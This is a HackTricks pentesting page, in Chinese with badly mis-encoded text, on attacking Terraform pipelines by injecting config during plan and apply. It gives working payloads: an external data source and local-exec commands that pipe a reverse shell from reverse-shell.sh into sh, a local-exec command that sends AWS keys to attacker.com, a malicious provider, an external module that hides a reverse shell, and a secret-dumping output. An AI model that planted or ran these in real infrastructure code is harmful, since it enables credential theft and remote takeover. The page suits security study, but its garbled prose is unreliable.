# Terraformå®‰å…¨

<details>

<summary><strong>æ”¯æŒHackTrickså¹¶è·å¾—ç¦åˆ©ï¼</strong></summary>

* å¦‚æœæ‚¨æƒ³åœ¨HackTricksä¸­çœ‹åˆ°æ‚¨çš„å…¬å¸å¹¿å‘Šï¼Œæˆ–è€…å¦‚æœæ‚¨æƒ³è®¿é—®PEASSçš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½PDFæ ¼å¼çš„HackTricksï¼Œè¯·æŸ¥çœ‹[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ï¼
* è·å–[**å®˜æ–¹PEASSå’ŒHackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* å‘ç°[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬çš„ç‹¬å®¶[**NFT**](https://opensea.io/collection/the-peass-family)æ”¶è—å“
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**Telegramç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨**æˆ‘çš„ **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **githubä»“åº“æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚**

</details>

## åŸºæœ¬ä¿¡æ¯

HashiCorp Terraformæ˜¯ä¸€ç§**åŸºç¡€è®¾æ–½å³ä»£ç å·¥å…·**ï¼Œå®ƒå…è®¸æ‚¨ä½¿ç”¨äººç±»å¯è¯»çš„é…ç½®æ–‡ä»¶å®šä¹‰**äº‘ç«¯å’Œæœ¬åœ°èµ„æº**ï¼Œå¹¶å¯¹å…¶è¿›è¡Œç‰ˆæœ¬æ§åˆ¶ã€é‡ç”¨å’Œå…±äº«ã€‚ç„¶åï¼Œæ‚¨å¯ä»¥ä½¿ç”¨ä¸€è‡´çš„å·¥ä½œæµç¨‹æ¥è§„åˆ’å’Œç®¡ç†æ•´ä¸ªåŸºç¡€è®¾æ–½çš„ç”Ÿå‘½å‘¨æœŸã€‚Terraformå¯ä»¥ç®¡ç†ä½çº§ç»„ä»¶ï¼Œå¦‚è®¡ç®—ã€å­˜å‚¨å’Œç½‘ç»œèµ„æºï¼Œä»¥åŠé«˜çº§ç»„ä»¶ï¼Œå¦‚DNSæ¡ç›®å’ŒSaaSåŠŸèƒ½ã€‚

### Terraformå¦‚ä½•å·¥ä½œï¼Ÿ

Terraformé€šè¿‡åº”ç”¨ç¨‹åºç¼–ç¨‹æ¥å£ï¼ˆAPIï¼‰åœ¨äº‘å¹³å°å’Œå…¶ä»–æœåŠ¡ä¸Šåˆ›å»ºå’Œç®¡ç†èµ„æºã€‚æä¾›è€…ä½¿Terraformèƒ½å¤Ÿä¸å‡ ä¹ä»»ä½•å…·æœ‰å¯è®¿é—®APIçš„å¹³å°æˆ–æœåŠ¡ä¸€èµ·å·¥ä½œã€‚

![](<../../.gitbook/assets/image (33).png>)

HashiCorpå’ŒTerraformç¤¾åŒºå·²ç»ç¼–å†™äº†**è¶…è¿‡1700ä¸ªæä¾›è€…**ï¼Œç”¨äºç®¡ç†æ•°åƒç§ä¸åŒç±»å‹çš„èµ„æºå’ŒæœåŠ¡ï¼Œè¿™ä¸ªæ•°å­—è¿˜åœ¨ä¸æ–­å¢é•¿ã€‚æ‚¨å¯ä»¥åœ¨[Terraform Registry](https://registry.terraform.io/)ä¸Šæ‰¾åˆ°æ‰€æœ‰å…¬å¼€å¯ç”¨çš„æä¾›è€…ï¼ŒåŒ…æ‹¬Amazon Web Services (AWS)ã€Azureã€Google Cloud Platform (GCP)ã€Kubernetesã€Helmã€GitHubã€Splunkã€DataDogç­‰ç­‰ã€‚

æ ¸å¿ƒçš„Terraformå·¥ä½œæµç¨‹åŒ…æ‹¬ä¸‰ä¸ªé˜¶æ®µï¼š

* **ç¼–å†™ï¼š**æ‚¨å®šä¹‰èµ„æºï¼Œè¿™äº›èµ„æºå¯èƒ½è·¨è¶Šå¤šä¸ªäº‘æä¾›å•†å’ŒæœåŠ¡ã€‚ä¾‹å¦‚ï¼Œæ‚¨å¯ä»¥åˆ›å»ºä¸€ä¸ªé…ç½®ï¼Œå°†åº”ç”¨ç¨‹åºéƒ¨ç½²åˆ°å…·æœ‰å®‰å…¨ç»„å’Œè´Ÿè½½å‡è¡¡å™¨çš„è™šæ‹Ÿæœºä¸­çš„è™šæ‹Ÿç§æœ‰äº‘ï¼ˆVPCï¼‰ç½‘ç»œä¸Šã€‚
* **è§„åˆ’ï¼š**Terraformåˆ›å»ºä¸€ä¸ªæ‰§è¡Œè®¡åˆ’ï¼Œæè¿°åŸºäºç°æœ‰åŸºç¡€è®¾æ–½å’Œæ‚¨çš„é…ç½®å°†è¦åˆ›å»ºã€æ›´æ–°æˆ–é”€æ¯çš„åŸºç¡€è®¾æ–½ã€‚
* **åº”ç”¨ï¼š**ç»è¿‡æ‰¹å‡†ï¼ŒTerraformæŒ‰ç…§æ­£ç¡®çš„é¡ºåºæ‰§è¡Œæ‰€æè®®çš„æ“ä½œï¼Œéµå®ˆä»»ä½•èµ„æºä¾èµ–å…³ç³»ã€‚ä¾‹å¦‚ï¼Œå¦‚æœæ‚¨æ›´æ–°äº†VPCçš„å±æ€§å¹¶æ›´æ”¹äº†è¯¥VPCä¸­çš„è™šæ‹Ÿæœºæ•°é‡ï¼ŒTerraformå°†åœ¨æ‰©å±•è™šæ‹Ÿæœºä¹‹å‰é‡æ–°åˆ›å»ºVPCã€‚

![](<../../.gitbook/assets/image (81).png>)

### Terraform Enterprise

Terraform Enterpriseå…è®¸æ‚¨åœ¨**Terraform Cloudçš„è‡ªæ‰˜ç®¡ç‰ˆæœ¬**ä¸­è¿œç¨‹è¿è¡Œ`terraform plan`æˆ–`terraform apply`ç­‰å‘½ä»¤ã€‚å› æ­¤ï¼Œå¦‚æœæ‚¨æ‰¾åˆ°äº†è®¿é—®è¯¥TerraformæœåŠ¡å™¨çš„**APIå¯†é’¥**ï¼Œæ‚¨å°±å¯ä»¥**å±å®³å®ƒ**ã€‚
æœ‰å…³æ›´å¤šä¿¡æ¯ï¼Œè¯·å‚é˜…ï¼š

{% content-ref url="terraform-enterprise-security.md" %}
[terraform-enterprise-security.md](terraform-enterprise-security.md)
{% endcontent-ref %}

## Terraformå®éªŒ

åªéœ€åœ¨è®¡ç®—æœºä¸Šå®‰è£…terraformã€‚

è¿™é‡Œæœ‰ä¸€ä¸ª[æŒ‡å—](https://learn.hashicorp.com/tutorials/terraform/install-cli)ï¼Œè¿™é‡Œæœ‰ä¸€ä¸ª[ä¸‹è½½terraformçš„æœ€ä½³æ–¹å¼](https://www.terraform.io/downloads)ã€‚

## Terraformä¸­çš„RCE

Terraform**æ²¡æœ‰å…¬å¼€çš„ç½‘é¡µæˆ–ç½‘ç»œæœåŠ¡**å¯ä»¥æšä¸¾ï¼Œå› æ­¤ï¼Œå…¥ä¾µterraformçš„å”¯ä¸€æ–¹æ³•æ˜¯**èƒ½å¤Ÿæ·»åŠ /ä¿®æ”¹terraformé…ç½®æ–‡ä»¶**ã€‚

ç„¶è€Œï¼Œterraformæ˜¯ä¸€ä¸ª**éå¸¸æ•æ„Ÿçš„ç»„ä»¶**ï¼Œå› ä¸ºå®ƒå°†å¯¹ä¸åŒä½ç½®å…·æœ‰**ç‰¹æƒè®¿é—®**ï¼Œä»¥ä¾¿èƒ½å¤Ÿæ­£å¸¸å·¥ä½œã€‚

æ”»å‡»è€…èƒ½å¤Ÿå…¥ä¾µè¿è¡Œterraformçš„ç³»ç»Ÿçš„ä¸»è¦æ–¹æ³•æ˜¯**å…¥ä¾µå­˜å‚¨terraformé…ç½®çš„å­˜å‚¨åº“**ï¼Œå› ä¸ºåœ¨æŸä¸ªæ—¶åˆ»å®ƒä»¬å°†è¢«**è§£é‡Š**ã€‚

å®é™…ä¸Šï¼Œå·²ç»æœ‰ä¸€äº›è§£å†³æ–¹æ¡ˆå¯ä»¥åœ¨åˆ›å»ºPRå**è‡ªåŠ¨æ‰§è¡Œterraform plan/apply**ï¼Œä¾‹å¦‚**Atlantis**ï¼š

{% content-ref url="../atlantis-security.md" %}
[atlantis-security.md](../atlantis-security.md)
{% endcontent-ref %}

å¦‚æœæ‚¨èƒ½å¤Ÿå…¥ä¾µterraformæ–‡ä»¶ï¼Œé‚£ä¹ˆåœ¨æ‰§è¡Œ`terraform plan`æˆ–`terraform apply`æ—¶ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨ä¸åŒçš„æ–¹æ³•æ‰§è¡ŒRCEã€‚

### Terraform plan

Terraform planæ˜¯terraformä¸­**æœ€å¸¸ç”¨çš„å‘½ä»¤**ï¼Œå¼€å‘äººå‘˜/ä½¿ç”¨terraformçš„è§£å†³æ–¹æ¡ˆç»å¸¸è°ƒç”¨å®ƒï¼Œå› æ­¤è·å¾—RCEçš„**æœ€ç®€å•æ–¹æ³•**æ˜¯ç¡®ä¿æ‚¨åœ¨ä¸€ä¸ªterraformé…ç½®æ–‡ä»¶ä¸­æ³¨å…¥å°†åœ¨`terraform plan`æ‰§è¡Œæ—¶æ‰§è¡Œä»»æ„å‘½ä»¤çš„ä»£ç ã€‚

#### ä½¿ç”¨å¤–éƒ¨æä¾›è€…

Terraformæä¾›äº†[`external`æä¾›è€…](https://registry.terraform.io/providers/hashicorp/external/latest/docs)ï¼Œå®ƒæä¾›äº†åœ¨Terraformå’Œå¤–éƒ¨ç¨‹åºä¹‹é—´è¿›è¡Œæ¥å£çš„æ–¹æ³•ã€‚æ‚¨å¯ä»¥ä½¿ç”¨`external`æ•°æ®æºåœ¨`plan`æœŸé—´è¿è¡Œä»»æ„ä»£ç ã€‚

åœ¨terraformé…ç½®æ–‡ä»¶ä¸­æ³¨å…¥ä»¥ä¸‹å†…å®¹å°†åœ¨æ‰§è¡Œ`terraform plan`æ—¶æ‰§è¡Œä¸€ä¸ªåå‘shellï¼š
```javascript
data "external" "example" {
program = ["sh", "-c", "curl https://reverse-shell.sh/8.tcp.ngrok.io:12946 | sh"]
}
```
#### ä½¿ç”¨è‡ªå®šä¹‰æä¾›ç¨‹åº

ä»»ä½•äººéƒ½å¯ä»¥ç¼–å†™ä¸€ä¸ª[è‡ªå®šä¹‰æä¾›ç¨‹åº](https://learn.hashicorp.com/tutorials/terraform/provider-setup)å¹¶å°†å…¶å‘å¸ƒåˆ°[Terraform Registry](https://registry.terraform.io/)ã€‚æ‚¨è¿˜å¯ä»¥å°è¯•ä»ç§æœ‰æ³¨å†Œè¡¨ä¸­æ‹‰å–è‡ªå®šä¹‰æä¾›ç¨‹åºã€‚

æ­¥éª¤å¦‚ä¸‹ï¼š

* ç¼–å†™ä¸€ä¸ªè‡ªå®šä¹‰æä¾›ç¨‹åºï¼Œè¿è¡Œä¸€äº›æ¶æ„ä»£ç ï¼ˆä¾‹å¦‚çªƒå–å‡­æ®æˆ–å®¢æˆ·æ•°æ®ï¼‰
* å°†å…¶å‘å¸ƒåˆ°Terraform Registry
* åœ¨åŠŸèƒ½åˆ†æ”¯ä¸­çš„Terraformä»£ç ä¸­æ·»åŠ æä¾›ç¨‹åº
* ä¸ºåŠŸèƒ½åˆ†æ”¯æ‰“å¼€ä¸€ä¸ªPR
```javascript
terraform {
required_providers {
evil = {
source  = "evil/evil"
version = "1.0"
}
}
}

provider "evil" {}
```
ç”±äºæä¾›ç¨‹åºå°†åœ¨`init`æœŸé—´è¢«æ‹‰å–å¹¶åœ¨`plan`æœŸé—´è¿è¡Œä¸€äº›ä»£ç ï¼Œå› æ­¤æ‚¨å¯ä»¥æ‰§è¡Œä»»æ„ä»£ç ã€‚

æ‚¨å¯ä»¥åœ¨[https://github.com/rung/terraform-provider-cmdexec](https://github.com/rung/terraform-provider-cmdexec)ä¸­æ‰¾åˆ°ä¸€ä¸ªç¤ºä¾‹ã€‚

#### ä½¿ç”¨å¤–éƒ¨å¼•ç”¨

ä¸Šè¿°ä¸¤ç§é€‰é¡¹éƒ½å¾ˆæœ‰ç”¨ï¼Œä½†ä¸å¤Ÿéšè”½ï¼ˆç¬¬äºŒç§æ¯”ç¬¬ä¸€ç§æ›´éšè”½ï¼Œä½†æ¯”ç¬¬ä¸€ç§æ›´å¤æ‚ï¼‰ã€‚æ‚¨å¯ä»¥ä»¥æ›´éšè”½çš„æ–¹å¼æ‰§è¡Œæ­¤æ”»å‡»ï¼ŒæŒ‰ç…§ä»¥ä¸‹å»ºè®®æ“ä½œï¼š

* ä¸è¦ç›´æ¥å°†åå‘shellæ·»åŠ åˆ°terraformæ–‡ä»¶ä¸­ï¼Œè€Œæ˜¯å¯ä»¥**åŠ è½½åŒ…å«åå‘shellçš„å¤–éƒ¨èµ„æº**ï¼š
```javascript
module "not_rev_shell" {
source = "git@github.com:carlospolop/terraform_external_module_rev_shell//modules"
}
```
æ‚¨å¯ä»¥åœ¨[https://github.com/carlospolop/terraform\_external\_module\_rev\_shell/tree/main/modules](https://github.com/carlospolop/terraform\_external\_module\_rev\_shell/tree/main/modules)æ‰¾åˆ°åå‘shellä»£ç ã€‚

* åœ¨å¤–éƒ¨èµ„æºä¸­ï¼Œä½¿ç”¨**ref**åŠŸèƒ½å°†**terraformåå‘shellä»£ç éšè—åœ¨å­˜å‚¨åº“çš„ä¸€ä¸ªåˆ†æ”¯ä¸­**ï¼Œç±»ä¼¼äºï¼š`git@github.com:carlospolop/terraform_external_module_rev_shell//modules?ref=b401d2b`

### Terraform Apply

å°†æ‰§è¡ŒTerraform applyä»¥åº”ç”¨æ‰€æœ‰æ›´æ”¹ï¼Œæ‚¨è¿˜å¯ä»¥æ»¥ç”¨å®ƒæ¥æ³¨å…¥**å¸¦æœ‰[local-exec](https://www.terraform.io/docs/provisioners/local-exec.html)çš„æ¶æ„Terraformæ–‡ä»¶**ä»¥è·å¾—RCEã€‚\
æ‚¨åªéœ€è¦ç¡®ä¿ä»¥ä¸‹ç±»ä¼¼çš„æœ‰æ•ˆè´Ÿè½½å‡ºç°åœ¨`main.tf`æ–‡ä»¶ä¸­ï¼š
```json
// Payload 1 to just steal a secret
resource "null_resource" "secret_stealer" {
provisioner "local-exec" {
command = "curl https://attacker.com?access_key=$AWS_ACCESS_KEY&secret=$AWS_SECRET_KEY"
}
}

// Payload 2 to get a rev shell
resource "null_resource" "rev_shell" {
provisioner "local-exec" {
command = "sh -c 'curl https://reverse-shell.sh/8.tcp.ngrok.io:12946 | sh'"
}
}
```
éµå¾ªå‰ä¸€ç§æŠ€æœ¯çš„å»ºè®®ï¼Œä½¿ç”¨å¤–éƒ¨å¼•ç”¨ä»¥æ›´éšè”½çš„æ–¹å¼æ‰§è¡Œæ­¤æ”»å‡»ã€‚

## å¯†é’¥æ³„éœ²

æ‚¨å¯ä»¥é€šè¿‡åœ¨terraformæ–‡ä»¶ä¸­æ·»åŠ ä»¥ä¸‹å†…å®¹æ¥è¿è¡Œ`terraform apply`æ¥è·å–terraformä½¿ç”¨çš„**ç§˜å¯†å€¼çš„è½¬å‚¨**ï¼š
```json
output "dotoken" {
value = nonsensitive(var.do_token)
}
```
## å®¡è®¡å·¥å…·

* [**tfsec**](https://github.com/aquasecurity/tfsec): tfsecä½¿ç”¨é™æ€åˆ†æä½ çš„terraformä»£ç æ¥å‘ç°æ½œåœ¨çš„é…ç½®é”™è¯¯ã€‚
* [**terascan**](https://github.com/tenable/terrascan): Terrascanæ˜¯ä¸€ç§ç”¨äºåŸºç¡€è®¾æ–½å³ä»£ç çš„é™æ€ä»£ç åˆ†æå™¨ã€‚

## å‚è€ƒèµ„æ–™

* [Atlantiså®‰å…¨](../atlantis-security.md)
* [https://alex.kaskaso.li/post/terraform-plan-rce](https://alex.kaskaso.li/post/terraform-plan-rce)

<details>

<summary><strong>æ”¯æŒHackTrickså¹¶è·å¾—ç¦åˆ©ï¼</strong></summary>

* å¦‚æœä½ æƒ³çœ‹åˆ°ä½ çš„**å…¬å¸åœ¨HackTricksä¸­è¢«å¹¿å‘Š**ï¼Œæˆ–è€…å¦‚æœä½ æƒ³è®¿é—®**PEASSçš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½PDFæ ¼å¼çš„HackTricks**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* è·å¾—[**å®˜æ–¹PEASSå’ŒHackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* å‘ç°[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)æ”¶è—å“
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**Telegramç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨**æˆ‘åœ¨**Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/carlospolopm)**ã€‚**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) **å’Œ** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **githubä»“åº“æäº¤PRæ¥åˆ†äº«ä½ çš„é»‘å®¢æŠ€å·§ã€‚**

</details>
